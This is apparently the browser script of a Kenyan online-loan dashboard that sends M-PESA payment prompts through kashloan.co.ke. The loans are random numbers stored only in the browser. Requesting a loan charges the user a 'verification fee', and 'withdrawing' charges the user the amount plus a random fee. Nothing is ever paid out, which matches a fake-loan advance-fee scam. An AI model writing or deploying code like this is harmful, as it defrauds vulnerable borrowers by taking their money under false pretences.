// Generate random tracking ID, loan amount, and withdrawal fee
function generateTrackingID() {
  const prefix = "KSLON-";
  const randomNumber = Math.floor(Math.random() * 100000000)
    .toString()
    .padStart(8, "0");
  return prefix + randomNumber;
}

function generateLoanAmount() {
  return Math.floor(Math.random() * (2000 - 100 + 5)) + 10000;
}

function generateWithdrawalFee() {
  return Math.floor(Math.random() * (300 - 100 + 5)) + 100;
}

// Populate dashboard with user and loan details on load
window.onload = function () {
  const name = localStorage.getItem("name") || "User";
  const loanAmount = localStorage.getItem("loanAmount") || "0";
  const loanType = localStorage.getItem("loanType") || "-";
  const trackingID = localStorage.getItem("trackingID") || "-";
  const loanBalance = localStorage.getItem("loanBalance") || loanAmount;

  document.getElementById("user-name").textContent = name;
  document.getElementById("loan-amount").textContent = `Ksh. ${loanAmount}`;
  document.getElementById("loan-type").textContent = loanType;
  document.getElementById("tracking-id").textContent = trackingID;
  document.getElementById("loan-balance").textContent = `Ksh. ${loanBalance}`;
};

// Handle Loan Request
document.getElementById("request-loan-btn").addEventListener("click", () => {
  const newLoanAmount = generateLoanAmount();
  const trackingID = generateTrackingID();
  const phone = localStorage.getItem("phone") || "";

  localStorage.setItem("loanAmount", newLoanAmount);
  localStorage.setItem("loanBalance", newLoanAmount);
  localStorage.setItem("trackingID", trackingID);

  alert(`Loan of Ksh. ${newLoanAmount} requested successfully!`);

  initiateMpesaPush(phone, 200, "Loan Request"); // Assuming a verification fee of 200
});

// Handle Loan Payment
document.getElementById("pay-loan-btn").addEventListener("click", () => {
  const paymentAmount = prompt("Enter the amount to pay:");
  if (paymentAmount) {
    const phone = localStorage.getItem("phone") || "712345678";
    initiateMpesaPush(phone, paymentAmount, "Loan Payment");
  }
});

// Handle Withdrawal
document.getElementById("withdraw-btn").addEventListener("click", () => {
  const withdrawalAmount = prompt("Enter the amount to withdraw:");
  if (withdrawalAmount) {
    const phone = localStorage.getItem("phone") || "712345678";
    const withdrawalFee = generateWithdrawalFee();
    const totalDeduction = parseInt(withdrawalAmount) + withdrawalFee;

    const currentBalance = parseInt(localStorage.getItem("loanBalance") || "0");

    if (totalDeduction > currentBalance) {
      alert("Insufficient balance for this withdrawal.");
    } else {
      initiateMpesaPush(phone, totalDeduction, "Withdrawal");
      updateLoanBalance(totalDeduction);
    }
  }
});

// M-PESA Push Function
function initiateMpesaPush(phone, amount, type) {
  fetch("https://kashloan.co.ke/stkpush", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ phone, amount }),
  })
    .then((response) => response.json())
    .then((data) => {
      if (data.ResponseCode === "0") {
        alert(`M-PESA push sent for ${type}. Please complete the transaction.`);
        window.location.reload();
      } else {
        alert(`Failed to send M-PESA push: ${data.CustomerMessage}`);
      }
    })
    .catch((error) => {
      console.error("Error initiating M-PESA push:", error);
      alert("An error occurred. Please try again.");
    });
}

// Update Loan Balance After Payment or Withdrawal
function updateLoanBalance(amount) {
  let currentBalance = parseInt(localStorage.getItem("loanBalance") || "0");
  currentBalance -= parseInt(amount);
  currentBalance = Math.max(0, currentBalance);

  localStorage.setItem("loanBalance", currentBalance);
  document.getElementById(
    "loan-balance"
  ).textContent = ` ${currentBalance}`;
}
